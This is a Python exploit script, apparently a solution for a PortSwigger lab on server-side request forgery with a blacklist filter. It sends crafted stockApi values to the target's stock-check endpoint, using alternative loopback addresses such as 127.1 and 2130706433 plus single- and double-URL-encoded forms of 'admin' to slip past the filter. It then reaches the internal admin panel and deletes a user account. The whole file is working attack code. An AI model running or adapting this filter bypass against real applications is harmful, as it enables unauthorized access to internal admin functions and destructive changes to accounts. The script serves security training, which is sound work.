# Created by sm6r, 2024
# Lab: https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter

import requests
import sys

if len(sys.argv) != 2:
    print("Usage: python sol.py $URL")
    exit()


url = sys.argv[1]+"/product/stock"

def getAdminIP():
    print("[+] Getting the Admins IP ......")
    possibleIPs=["127.0.0.1","localhost","127.1","2130706433"]
    
    for ip in possibleIPs:
        stock = f"http://{ip}"
        resp = requests.post(url,data={"stockApi":stock})
        if resp.status_code == 504:
            print("Gateway timeout")
            exit()
        if resp.status_code == 200:
            print(f"[*] {stock} --> got a 200 OK <--")
            print("*"*50)
            return ip
        else:
            print(f"{stock}")


def accessAdminPanel(ip):
    print("[+] Accessing Admin Panel ......")
    possibleAdminEncodings = ["admin","%61%64%6d%69%6e","%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65","%25%36%31dmin","%61dmin"]

    for enc in possibleAdminEncodings:
        stock = f"http://{ip}/{enc}"
        resp = requests.post(url,data={"stockApi":stock})
       
        if resp.status_code == 504:
            print("Gateway timeout")
            exit()
        
        if resp.status_code == 200:
            print(f"[*] {stock} --> got a 200 OK <--")
            print("*"*50)
            return enc
        
        else:
            print(f"{stock}")
    

def deleteCarlos(ip,enc):
        print("[+] Deleting carlos .... ")
        stock = f"http://{ip}/{enc}/delete?username=carlos"
        
        resp = requests.post(url,data={"stockApi":stock})
       
        if resp.status_code == 504:
            print("Gateway timeout")
            exit()
        
        if resp.status_code == 302:
            print(f"[*] Carlos deleted successfully.")
            exit()
        
        else:
            print("Carlos wasnt deleted, something went wrong")


def main():
    print("*"*50)
    ip = getAdminIP()
    enc = accessAdminPanel(ip)
    deleteCarlos(ip,enc)
    

main()
